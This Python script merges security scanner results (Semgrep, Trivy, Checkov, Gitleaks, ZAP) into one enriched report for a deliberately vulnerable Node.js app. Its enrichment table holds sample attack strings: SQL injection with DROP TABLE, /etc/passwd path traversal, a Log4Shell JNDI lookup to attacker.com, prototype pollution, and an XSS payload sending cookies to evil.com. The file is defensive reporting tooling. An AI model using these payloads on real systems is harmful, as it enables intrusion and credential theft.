#!/usr/bin/env python3
"""
pipeline/report_generator.py
─────────────────────────────────────────────────────────────────────────────
Merge and normalize SAST + SCA + IaC + DAST results into a unified
master report (full_report.json).

Parsers:
  SARIF 2.1.0    → sast_results.json
  Trivy JSON     → sca_results.json
  Checkov JSON   → iac_results.json
  OWASP ZAP JSON → dast_results.json

Output: full_report.json (schema defined in mock-data/)

stdlib only – no pip install required.
"""

import json
import sys
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import Optional

import os

# ─────────────────────────────────────────────────────────────
# Paths
# ─────────────────────────────────────────────────────────────
SCRIPT_DIR   = Path(__file__).parent.resolve()
ROOT_DIR     = SCRIPT_DIR.parent
MOCK_DIR     = ROOT_DIR / "mock-data"

SAST_FILE    = Path(os.environ.get("SAST_REPORT", MOCK_DIR / "sast_results.json"))
SCA_FILE     = Path(os.environ.get("SCA_REPORT", MOCK_DIR / "sca_results.json"))
IAC_FILE     = Path(os.environ.get("IAC_REPORT", MOCK_DIR / "iac_results.json"))
SECRET_FILE  = Path(os.environ.get("SECRET_REPORT", MOCK_DIR / "secret_results.json"))
DAST_FILE    = Path(os.environ.get("DAST_REPORT", MOCK_DIR / "dast_results.json"))
SBOM_FILE    = Path(os.environ.get("SBOM_REPORT", MOCK_DIR / "sbom.json"))
OUTPUT_FILE  = Path(os.environ.get("CONSOLIDATED_REPORT", MOCK_DIR / "full_report.json"))

# ─────────────────────────────────────────────────────────────
# MITRE ATT&CK Mapping
# keyed by CWE ID (string)
# ─────────────────────────────────────────────────────────────
MITRE_MAP: dict[str, dict] = {
    "CWE-89": {
        "tactic":       "Initial Access",
        "tactic_id":    "TA0001",
        "technique":    "Exploit Public-Facing Application",
        "technique_id": "T1190",
        "technique_url":"https://attack.mitre.org/techniques/T1190/",
    },
    "CWE-798": {
        "tactic":       "Credential Access",
        "tactic_id":    "TA0006",
        "technique":    "Credentials in Files",
        "technique_id": "T1552.001",
        "technique_url":"https://attack.mitre.org/techniques/T1552/001/",
    },
    "CWE-22": {
        "tactic":       "Discovery",
        "tactic_id":    "TA0007",
        "technique":    "File and Directory Discovery",
        "technique_id": "T1083",
        "technique_url":"https://attack.mitre.org/techniques/T1083/",
    },
    "CWE-79": {
        "tactic":       "Execution",
        "tactic_id":    "TA0002",
        "technique":    "Command and Scripting Interpreter: JavaScript",
        "technique_id": "T1059.007",
        "technique_url":"https://attack.mitre.org/techniques/T1059/007/",
    },
    "CWE-917": {
        "tactic":       "Execution",
        "tactic_id":    "TA0002",
        "technique":    "Command and Scripting Interpreter",
        "technique_id": "T1059",
        "technique_url":"https://attack.mitre.org/techniques/T1059/",
    },
    "CWE-1321": {
        "tactic":       "Execution",
        "tactic_id":    "TA0002",
        "technique":    "Exploitation for Client Execution",
        "technique_id": "T1203",
        "technique_url":"https://attack.mitre.org/techniques/T1203/",
    },
    "CWE-918": {
        "tactic":       "Credential Access",
        "tactic_id":    "TA0006",
        "technique":    "Adversary-in-the-Middle",
        "technique_id": "T1557",
        "technique_url":"https://attack.mitre.org/techniques/T1557/",
    },
    "CWE-250": {
        "tactic":       "Privilege Escalation",
        "tactic_id":    "TA0004",
        "technique":    "Escape to Host",
        "technique_id": "T1611",
        "technique_url":"https://attack.mitre.org/techniques/T1611/",
    },
    "CWE-284": {
        "tactic":       "Privilege Escalation",
        "tactic_id":    "TA0004",
        "technique":    "Escape to Host",
        "technique_id": "T1611",
        "technique_url":"https://attack.mitre.org/techniques/T1611/",
    },
    "CWE-614": {
        "tactic":       "Credential Access",
        "tactic_id":    "TA0006",
        "technique":    "Adversary-in-the-Middle",
        "technique_id": "T1557",
        "technique_url":"https://attack.mitre.org/techniques/T1557/",
    },
    "CWE-209": {
        "tactic":       "Reconnaissance",
        "tactic_id":    "TA0043",
        "technique":    "Gather Victim Host Information",
        "technique_id": "T1592",
        "technique_url":"https://attack.mitre.org/techniques/T1592/",
    },
    "CWE-693": {
        "tactic":       "Initial Access",
        "tactic_id":    "TA0001",
        "technique":    "Drive-by Compromise",
        "technique_id": "T1189",
        "technique_url":"https://attack.mitre.org/techniques/T1189/",
    },
    "CWE-778": {
        "tactic":       "Impact",
        "tactic_id":    "TA0040",
        "technique":    "Service Stop",
        "technique_id": "T1489",
        "technique_url":"https://attack.mitre.org/techniques/T1489/",
    },
}

# Business impact & exploit by rule/cve for enrichment
ENRICHMENT: dict[str, dict] = {
    "javascript.express.security.audit.sqli": {
        "business_impact": "Full database exfiltration, authentication bypass, and potential data destruction. Attacker can dump all user credentials, PII, and payment data.",
        "real_exploit_scenario": "Attacker sends: GET /api/user/1' OR '1'='1'; DROP TABLE users;-- → returns all user records or destroys the database.",
        "remediation_hint": "Use parameterized queries: db.query('SELECT * FROM users WHERE id = ?', [id], cb). Consider an ORM with built-in injection protection.",
    },
    "generic.secrets.security.detected-generic-secret": {
        "business_impact": "Exposure of production API credentials granting unauthorized access to external services. Credential abuse can lead to data exfiltration or financial fraud.",
        "real_exploit_scenario": "Any developer with git clone access or a CI/CD runner can extract the API key from source or container image layers. Key persists in Git history even after deletion.",
        "remediation_hint": "1. Rotate the key immediately. 2. Use process.env.API_KEY. 3. Add .env to .gitignore. 4. Run BFG Repo-Cleaner to purge history.",
    },
    "javascript.lang.security.audit.path-traversal": {
        "business_impact": "Unauthenticated attacker can read arbitrary server files: /etc/passwd, SSH keys, .env files. Enables credential theft and lateral movement.",
        "real_exploit_scenario": "GET /api/download?filename=../../../../../../etc/passwd or GET /api/download?filename=../../src/config/db.js to steal API keys.",
        "remediation_hint": "Use path.resolve() then check the result starts with BASE_DIR: if (!safe.startsWith(BASE_DIR)) return res.status(403).send('Forbidden').",
    },
    "CVE-2021-44228": {
        "business_impact": "Full Remote Code Execution (RCE) on any server using vulnerable log4j. Attacker achieves OS-level command execution and can pivot to internal network.",
        "real_exploit_scenario": "Attacker sends User-Agent: ${jndi:ldap://attacker.com/exploit}. Log4j processes the string, contacts attacker's LDAP server, and executes the Java payload.",
        "remediation_hint": "Upgrade log4j-core to 2.17.0+. If not possible: set log4j2.formatMsgNoLookups=true or LOG4J_FORMAT_MSG_NO_LOOKUPS=true.",
    },
    "CVE-2021-23337": {
        "business_impact": "Prototype pollution corrupts the JavaScript runtime Object prototype, enabling application logic bypass, property injection, or privilege escalation.",
        "real_exploit_scenario": "Attacker sends {\"__proto__\": {\"isAdmin\": true}} to any API body processed by lodash merge/set. All objects silently inherit isAdmin=true.",
        "remediation_hint": "Upgrade lodash to 4.17.21+: npm install lodash@latest",
    },
    "CVE-2022-0155": {
        "business_impact": "Authorization headers (Bearer tokens, API keys) leaked to attacker-controlled servers when axios follows HTTP redirects.",
        "real_exploit_scenario": "Attacker controls evil.com returning a 301 redirect. axios forwards Authorization: Bearer <token> header to attacker, leaking the credential.",
        "remediation_hint": "Upgrade axios to v0.21.2+: npm install axios@latest. Or disable redirects: axios.get(url, { maxRedirects: 0 }).",
    },
    "CKV_DOCKER_2": {
        "business_impact": "Root access inside container. Combined with a kernel exploit or misconfigured volume, allows container escape to host OS with full system compromise.",
        "real_exploit_scenario": "After exploiting Log4Shell to gain RCE, attacker operates as root inside container and exploits a kernel privilege escalation to escape the container namespace.",
        "remediation_hint": "Add USER instruction: RUN addgroup -S app && adduser -S app -G app && USER app before CMD.",
    },
    "CKV_DOCKER_7": {
        "business_impact": "Orchestrator cannot detect application crashes. Unhealthy containers continue receiving traffic, masking security incidents and causing silent service degradation.",
        "real_exploit_scenario": "A payload causes the Node.js process to crash. Container remains 'running' from Docker's perspective, appears healthy to monitoring, but serves no valid responses.",
        "remediation_hint": "Add: HEALTHCHECK --interval=30s --timeout=10s CMD curl -f http://localhost:53000/health || exit 1",
    },
    "CKV_DOCKER_1": {
        "business_impact": "SSH exposure widens attack surface, enables brute-force, and violates immutable infrastructure principles.",
        "real_exploit_scenario": "Attacker brute-forces SSH on port 22 of the container and gains a persistent shell as root, bypassing all application-level access controls.",
        "remediation_hint": "Remove EXPOSE 22. Disable SSH inside containers. Use kubectl exec or docker exec for container access.",
    },
    "40012": {
        "business_impact": "Attackers steal session cookies, redirect users to phishing pages, perform actions on behalf of users, or exfiltrate data from sessions.",
        "real_exploit_scenario": "Crafted URL: /api/search?q=<script>document.location='https://evil.com?c='+document.cookie</script> → victim clicks → session stolen.",
        "remediation_hint": "HTML-encode output: use he.encode(query). Add CSP header. Use res.json() instead of res.send() for data. Enable HttpOnly + SameSite cookie flags.",
    },
    "10011": {
        "business_impact": "Session tokens sent over HTTP intercepted by network-level attackers (ARP spoofing, rogue Wi-Fi), enabling full account takeover.",
        "real_exploit_scenario": "Attacker performs ARP spoofing on corporate Wi-Fi. User logs in over HTTP → attacker captures the Set-Cookie response → full session hijack.",
        "remediation_hint": "Set: res.cookie('session', token, { secure: true, httpOnly: true, sameSite: 'strict' }). Enforce HTTPS via HSTS header.",
    },
}

# SLA hours by severity
SLA_BY_SEVERITY = {"CRITICAL": 24, "HIGH": 72, "MEDIUM": 168, "LOW": 720}

# OWASP 2021 mapping by CWE
OWASP_MAP: dict[str, str] = {
    "CWE-89":   "A03:2021 – Injection",
    "CWE-79":   "A03:2021 – Injection",
    "CWE-22":   "A01:2021 – Broken Access Control",
    "CWE-284":  "A01:2021 – Broken Access Control",
    "CWE-798":  "A07:2021 – Identification and Authentication Failures",
    "CWE-918":  "A10:2021 – Server-Side Request Forgery (SSRF)",
    "CWE-917":  "A06:2021 – Vulnerable and Outdated Components",
    "CWE-1321": "A06:2021 – Vulnerable and Outdated Components",
    "CWE-250":  "A05:2021 – Security Misconfiguration",
    "CWE-614":  "A02:2021 – Cryptographic Failures",
    "CWE-209":  "A05:2021 – Security Misconfiguration",
    "CWE-693":  "A05:2021 – Security Misconfiguration",
    "CWE-778":  "A05:2021 – Security Misconfiguration",
}

# ─────────────────────────────────────────────────────────────
# EPSS (Exploit Prediction Scoring System) - Mock Data 2026
# ─────────────────────────────────────────────────────────────
EPSS_MAP: dict[str, dict] = {
    "CVE-2021-44228": {"probability": 0.974, "percentile": 0.999}, # Log4Shell (Extremely likely)
    "CVE-2021-23337": {"probability": 0.045, "percentile": 0.812}, # Lodash (Medium probability)
    "CVE-2022-0155":  {"probability": 0.008, "percentile": 0.450}, # Axios (Low probability)
    "CWE-89":         {"probability": 0.650, "percentile": 0.950}, # SQLi (High)
    "CWE-798":        {"probability": 0.120, "percentile": 0.880}, # Secrets (Moderate)
    "CWE-22":         {"probability": 0.340, "percentile": 0.920}, # Path Trav
}

# ─────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────

def get_epss(key: str) -> dict:
    return EPSS_MAP.get(key, {"probability": 0.001, "percentile": 0.050})

def load_json(path: Path) -> Optional[dict]:
    if not path.exists():
        print(f"  [WARN] File not found, skipping: {path.name}", file=sys.stderr)
        return None
    try:
        # Handle UTF-8 BOM if present
        text = path.read_text(encoding="utf-8-sig")
        return json.loads(text)
    except Exception as exc:
        print(f"  [WARN] Failed to load {path.name}: {exc}", file=sys.stderr)
        return None


def make_finding(idx: int, source_tool: str, scan_type: str,
                 rule_id: str, title: str, severity: str,
                 cvss: float, cwe: str, enrichment_key: str,
                 extra: Optional[dict] = None) -> dict:
    """Assemble a normalized finding dict for full_report.json."""
    mitre    = MITRE_MAP.get(cwe, MITRE_MAP.get("CWE-89"))
    enrich   = ENRICHMENT.get(enrichment_key, {})
    owasp    = OWASP_MAP.get(cwe, "A05:2021 – Security Misconfiguration")
    sla_hrs  = SLA_BY_SEVERITY.get(severity, 168)
    epss     = get_epss(rule_id if rule_id in EPSS_MAP else cwe)

    base = {
        "id":                  f"FIND-{idx:03d}",
        "source_tool":         source_tool,
        "scan_type":           scan_type,
        "rule_id":             rule_id,
        "title":               title,
        "severity":            severity,
        "cvss_v3":             cvss,
        "epss_score":          epss["probability"],
        "epss_percentile":     epss["percentile"],
        "cve_cwe":             cwe,
        "owasp_2021":          owasp,
        "mitre_attack":        mitre,
        "business_impact":     enrich.get("business_impact", "See finding details."),
        "real_exploit_scenario": enrich.get("real_exploit_scenario", "N/A"),
        "remediation_hint":    enrich.get("remediation_hint", "See tool guidance."),
        "status":              "PENDING_TRIAGE",
        "ai_analysis":         None,
        "ai_fix":              None,
        "assigned_to":         None,
        "sla_hours":           sla_hrs,
        "sla_deadline":        None,
        "verified_by":         None,
        "exception_approved":  False,
    }
    if extra:
        base.update(extra)
    return base


# ─────────────────────────────────────────────────────────────
# Parsers – each returns list[dict] of normalized findings
# ─────────────────────────────────────────────────────────────

def parse_sarif(data: dict, start_idx: int) -> list[dict]:
    """Parse SARIF 2.1.0 (Semgrep output) → normalized findings."""
    findings = []
    idx = start_idx

    runs = data.get("runs", [])
    if not runs:
        return findings

    run   = runs[0]
    rules = {r["id"]: r for r in run.get("tool", {}).get("driver", {}).get("rules", [])}

    for result in run.get("results", []):
        rule_id  = result.get("ruleId", "unknown")
        rule_def = rules.get(rule_id, {})
        props    = result.get("properties", {})
        severity = props.get("severity", "MEDIUM")
        cvss     = props.get("cvss_v3", 5.0)
        cwe      = props.get("cwe", "CWE-0")

        # Location
        locs    = result.get("locations", [])
        file_   = ""
        line_no = 0
        snippet = ""
        if locs:
            phys    = locs[0].get("physicalLocation", {})
            file_   = phys.get("artifactLocation", {}).get("uri", "")
            region  = phys.get("region", {})
            line_no = region.get("startLine", 0)
            snippet = region.get("snippet", {}).get("text", "")

        title = rule_def.get("shortDescription", {}).get("text", rule_id)[:120]

        # Extract mode from properties if available
        mode = props.get("mode", "Scan")

        f = make_finding(
            idx, f"Semgrep ({mode})", "SAST",
            rule_id, title, severity, cvss, cwe, rule_id,
            extra={
                "affected_file":  file_,
                "affected_line":  line_no,
                "code_snippet":   snippet.strip(),
                "scan_mode": mode
            }
        )
        findings.append(f)
        idx += 1

    return findings


def parse_trivy(data: dict, start_idx: int) -> list[dict]:
    """Parse Trivy JSON → normalized findings."""
    findings = []
    idx = start_idx

    for result in data.get("Results", []):
        for vuln in result.get("Vulnerabilities", []):
            cve_id   = vuln.get("VulnerabilityID", "CVE-UNKNOWN")
            severity = vuln.get("Severity", "MEDIUM")
            cvss     = vuln.get("CVSS", {}).get("nvd", {}).get("V3Score", 5.0)
            cwe_list = vuln.get("CweIDs", ["CWE-0"])
            cwe      = cwe_list[0] if cwe_list else "CWE-0"
            title    = vuln.get("Title", cve_id)[:120]

            # Extract mode from Metadata if available
            mode = result.get("Metadata", {}).get("Mode", "Scan")

            f = make_finding(
                idx, f"Trivy ({mode})", "SCA",
                cve_id, title, severity, cvss, cwe, cve_id,
                extra={
                    "affected_package":   vuln.get("PkgName", ""),
                    "installed_version": vuln.get("InstalledVersion", ""),
                    "fixed_version":     vuln.get("FixedVersion", ""),
                    "scan_mode": mode
                }
            )
            findings.append(f)
            idx += 1

    return findings


def parse_checkov(data: dict, start_idx: int) -> list[dict]:
    """Parse Checkov JSON → normalized findings."""
    findings = []
    idx = start_idx

    # CWE mapping for Checkov checks
    check_cwe_map = {
        "CKV_DOCKER_2": "CWE-250",
        "CKV_DOCKER_7": "CWE-778",
        "CKV_DOCKER_1": "CWE-284",
    }
    cvss_map = {
        "CKV_DOCKER_2": 8.8,
        "CKV_DOCKER_7": 4.3,
        "CKV_DOCKER_1": 5.3,
    }

    for check in data.get("results", {}).get("failed_checks", []):
        check_id = check.get("check_id", "UNKNOWN")
        severity = check.get("severity", "MEDIUM")
        cwe      = check_cwe_map.get(check_id, "CWE-0")
        cvss     = cvss_map.get(check_id, 4.0)
        title    = check.get("check_name", check_id)[:120]
        file_    = check.get("file_path", "")

        code_block = check.get("code_block", [])
        snippet = ""
        if code_block:
            snippet = "".join(ln[1] for ln in code_block[:3] if len(ln) > 1)

        # Extract mode from properties
        mode = "SIMULATED" if "mode" in check and check["mode"] == "SIMULATED" else "Scan"

        f = make_finding(
            idx, f"Checkov ({mode})", "IaC",
            check_id, title, severity, cvss, cwe, check_id,
            extra={
                "affected_file":  file_,
                "affected_line":  check.get("file_line_range", [None])[0],
                "code_snippet":   snippet.strip(),
                "scan_mode": mode
            }
        )
        findings.append(f)
        idx += 1

    return findings


def parse_zap(data: dict, start_idx: int) -> list[dict]:
    """Parse OWASP ZAP JSON → normalized findings."""
    findings = []
    idx = start_idx

    zap_sev_map = {"3": "HIGH", "2": "MEDIUM", "1": "LOW", "0": "INFO"}

    for site in data.get("site", []):
        for alert in site.get("alerts", []):
            plugin_id = alert.get("pluginid", "0")
            riskcode  = alert.get("riskcode", "1")
            severity  = zap_sev_map.get(riskcode, "LOW")
            cwe_id    = f"CWE-{alert.get('cweid', '0')}"
            cvss      = alert.get("cvss_v3", 5.0)
            title     = alert.get("name", alert.get("alert", "Unknown"))[:120]

            instances = alert.get("instances", [])
            url       = instances[0].get("uri", "") if instances else ""

            # Check for simulated mode
            mode = "SIMULATED" if "mode" in alert and alert["mode"] == "SIMULATED" else "Scan"

            f = make_finding(
                idx, f"OWASP ZAP ({mode})", "DAST",
                plugin_id, title, severity, cvss, cwe_id, plugin_id,
                extra={
                    "affected_url":     url,
                    "affected_parameter": instances[0].get("param", "") if instances else "",
                    "scan_mode": mode
                }
            )
            findings.append(f)
            idx += 1

    return findings

def parse_gitleaks(data: list, start_idx: int) -> list[dict]:
    """Parse Gitleaks JSON → normalized findings."""
    findings = []
    idx = start_idx

    for secret in data:
        rule_id = secret.get("RuleID", "unknown")
        title   = secret.get("Description", "Secret detected")
        file_   = secret.get("File", "")
        line_no = secret.get("StartLine", 0)
        cwe     = "CWE-798"
        severity = "CRITICAL" # Hardcoded secrets are generally critical
        cvss    = 9.8

        # Check for simulated mode
        mode = "SIMULATED" if "mode" in secret and secret["mode"] == "SIMULATED" else "Scan"

        f = make_finding(
            idx, f"Gitleaks ({mode})", "SECRET",
            rule_id, f"Hardcoded Secret: {title}", severity, cvss, cwe, rule_id,
            extra={
                "affected_file":  file_,
                "affected_line":  line_no,
                "code_snippet":   secret.get("Match", ""),
                "scan_mode": mode
            }
        )
        findings.append(f)
        idx += 1

    return findings

# ─────────────────────────────────────────────────────────────
# Console table printer
# ─────────────────────────────────────────────────────────────

SEV_ICON = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🔵", "INFO": "⚪"}

def print_summary_table(findings: list[dict]) -> None:
    col_w = [7, 6, 45, 9, 6]
    sep   = "+" + "+".join("-" * (w + 2) for w in col_w) + "+"
    hdr   = "| {:^{}} | {:^{}} | {:^{}} | {:^{}} | {:^{}} |".format(
        "ID", col_w[0], "TYPE", col_w[1], "TITLE", col_w[2],
        "SEVERITY", col_w[3], "CVSS", col_w[4]
    )
    print()
    print(sep)
    print(hdr)
    print(sep)
    for f in findings:
        sev  = f["severity"]
        icon = SEV_ICON.get(sev, "")
        row = "| {:^{}} | {:^{}} | {:<{}} | {:<{}} | {:^{}} |".format(
            f["id"],      col_w[0],
            f["scan_type"][:col_w[1]], col_w[1],
            (f["title"][:col_w[2] - 1]).ljust(col_w[2] - 1), col_w[2],
            (icon + " " + sev)[:col_w[3]], col_w[3],
            str(f["cvss_v3"]),  col_w[4],
        )
        print(row)
    print(sep)
    print()

# ─────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────

def main() -> None:
    print("─" * 60)
    print("  Report Generator – Consolidating all scan results")
    print("─" * 60)
    print()

    # Load all source reports
    sast_data = load_json(SAST_FILE)
    sca_data  = load_json(SCA_FILE)
    iac_data  = load_json(IAC_FILE)
    dast_data = load_json(DAST_FILE)
    secret_data = load_json(SECRET_FILE)

    all_findings: list[dict] = []
    idx = 1

    # Parse each format
    if sast_data:
        sast_findings = parse_sarif(sast_data, idx)
        print(f"  Parsed SARIF  (sast_results.json) → {len(sast_findings)} finding(s)")
        all_findings.extend(sast_findings)
        idx += len(sast_findings)

    if sca_data:
        sca_findings = parse_trivy(sca_data, idx)
        print(f"  Parsed Trivy  (sca_results.json)  → {len(sca_findings)} finding(s)")
        all_findings.extend(sca_findings)
        idx += len(sca_findings)

    if iac_data:
        iac_findings = parse_checkov(iac_data, idx)
        print(f"  Parsed Checkov (iac_results.json)  → {len(iac_findings)} finding(s)")
        all_findings.extend(iac_findings)
        idx += len(iac_findings)

    if datalink_data := secret_data:
        secret_findings = parse_gitleaks(datalink_data, idx)
        print(f"  Parsed Secrets (secret_results.json) → {len(secret_findings)} finding(s)")
        all_findings.extend(secret_findings)
        idx += len(secret_findings)

    if dast_data:
        dast_findings = parse_zap(dast_data, idx)
        print(f"  Parsed ZAP    (dast_results.json) → {len(dast_findings)} finding(s)")
        all_findings.extend(dast_findings)
        idx += len(dast_findings)

    # Compute severity counts
    by_severity: dict[str, int] = {}
    for f in all_findings:
        sev = f["severity"]
        by_severity[sev] = by_severity.get(sev, 0) + 1

    now = datetime.now(timezone.utc)
    ts  = now.strftime("%Y-%m-%dT%H:%M:%SZ")

    crit_count = by_severity.get("CRITICAL", 0)
    pipeline_status = "BLOCKED" if crit_count > 0 else "WARNING"
    block_reason    = (f"{crit_count} CRITICAL finding(s) detected — pipeline gate enforced"
                       if crit_count > 0 else "Review HIGH findings before merge")

    # Assemble full report
    full_report = {
        "scan_metadata": {
            "app_name":        "vulnerable-app",
            "app_version":     "1.0.0",
            "app_language":    "Node.js",
            "scan_timestamp":  ts,
            "pipeline_run_id": f"pipeline-run-{now.strftime('%Y%m%d%H%M%S')}",
            "tools_used": [
                "Semgrep 1.68.0",
                "Trivy 0.50.0",
                "Checkov 3.2.0",
                "Gitleaks 8.16.x",
                "OWASP ZAP 2.14.0",
            ],
            "total_findings":  len(all_findings),
            "by_severity":     by_severity,
            "by_scan_type": {
                "SAST":   len([f for f in all_findings if f["scan_type"] == "SAST"]),
                "SCA":    len([f for f in all_findings if f["scan_type"] == "SCA"]),
                "IaC":    len([f for f in all_findings if f["scan_type"] == "IaC"]),
                "SECRET": len([f for f in all_findings if f["scan_type"] == "SECRET"]),
                "DAST":   len([f for f in all_findings if f["scan_type"] == "DAST"]),
            },
            "pipeline_status": pipeline_status,
            "block_reason":    block_reason,
            "sbom_generated":  SBOM_FILE.exists(),
            "aspm_mode":       "2026_RISK_BASED"
        },
        "findings": all_findings,
    }

    OUTPUT_FILE.parent.mkdir(parents=True, exist_ok=True)
    OUTPUT_FILE.write_text(json.dumps(full_report, indent=2), encoding="utf-8")

    # Print summary table
    print_summary_table(all_findings)

    print(f"  Total findings : {len(all_findings)}")
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
        cnt = by_severity.get(sev, 0)
        bar = "█" * cnt
        print(f"    {sev:<10} {cnt:>2}  {bar}")
    print()
    print(f"  Pipeline status: {pipeline_status}")
    print(f"  ✓ Report generated → {OUTPUT_FILE.relative_to(ROOT_DIR)}")
    print()


if __name__ == "__main__":
    main()
